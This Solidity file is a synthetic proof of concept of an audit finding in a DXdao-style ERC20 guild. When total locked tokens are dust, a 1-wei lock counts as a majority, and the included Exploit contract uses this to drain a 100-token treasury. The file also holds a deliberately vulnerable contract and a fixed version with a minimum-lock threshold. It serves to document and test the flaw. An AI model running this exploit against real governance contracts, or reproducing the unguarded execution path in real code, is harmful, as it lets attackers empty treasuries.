// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  DXdao BaseERC20Guild — a tiny lock is a majority when totalLocked is dust
    (Sigma Prime, finding 19345).

    SYNTHETIC, cheatcode-free. Execution needs more than half of totalLocked.
    The attacker locks 1 wei and is the only locker, so 1 wei is 100 percent.
    The proposal transfers the guild's 100e18.

    The control requires totalLocked of at least 1000e18 before execution.
    The 1 wei lock cannot move the 100e18. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Guild {
    Asset public asset;
    uint256 public totalLocked;
    mapping(address => uint256) public locked;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function lock(uint256 amount) external {
        locked[msg.sender] += amount;
        totalLocked += amount;
    }

    function execute(address to, uint256 amount) external {
        require(locked[msg.sender] * 2 > totalLocked, "majority");
        _move(to, amount);
    }

    function _move(address to, uint256 amount) internal virtual {
        // @> VULN: execution has no minimum totalLocked, so 1 wei of lock spends the treasury.
        asset.transfer(to, amount);
        // FIX: require totalLocked >= a real threshold before the transfer.
    }
}

contract GuildFixed is Guild {
    uint256 public constant MIN_LOCKED = 1000 ether;

    constructor(Asset _asset) Guild(_asset) {}

    function _move(address to, uint256 amount) internal override {
        require(totalLocked >= MIN_LOCKED, "threshold");
        asset.transfer(to, amount);
    }
}

contract Exploit {
    uint256 public constant N = 100 ether;
    uint256 public constant DUST = 1;

    Asset public asset;
    Guild public guild;
    uint256 public taken;

    constructor() {
        asset = new Asset();
        guild = new Guild(asset);
    }

    function run() external {
        asset.mint(address(guild), N);
        uint256 beforeBal = asset.balanceOf(address(this));
        guild.lock(DUST);
        require(guild.totalLocked() == DUST, "lock is not dust");
        guild.execute(address(this), N);
        taken = asset.balanceOf(address(this)) - beforeBal;
        require(taken == N, "harm");
        require(asset.balanceOf(address(guild)) == 0, "treasury remains");
    }
}
